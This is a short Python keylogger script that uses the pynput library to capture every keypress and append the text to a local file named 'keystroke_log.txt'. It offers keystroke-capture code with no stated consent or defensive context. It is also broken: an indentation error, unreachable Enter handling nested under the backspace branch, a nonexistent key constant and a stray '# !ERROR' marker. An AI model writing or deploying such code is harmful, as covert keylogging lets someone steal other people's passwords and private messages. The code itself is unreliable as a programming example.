
from pynput import keyboard
import datetime

logged_keys = []

def on_press(key):
    """Callback function when a key is pressed"""
    global logged_keys
    try:
        
                logged_keys.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            logged_keys.append(' ')
        else:
            if  key == keyboard.Key.backspace:
                if logged_keys:
                    logged_keys.pop()
                else:
                    if key == keyboard.Key.enter or  key == keyboard.Key.period:

                        save_logged_keys()
                        logged_keys.clear()
                    else:
                        logged_keys.append(str(key))
            # !ERROR 
def save_logged_keys():
    """Save the logged keys to the file"""
    try:
        with open("keystroke_log.txt", "a") as log_file:
            log_file.write(f"{''.join(logged_keys)}\n")
        print("File saved successfully.")
    except Exception as e:
        print(f"Error saving file: {e}")

# Create a log file
log_file = open("keystroke_log.txt", "a")

# Create a keyboard listener
listener = keyboard.Listener(on_press=on_press)

# Start the listener
listener.start()
listener.join()

# Close the log file
log_file.close()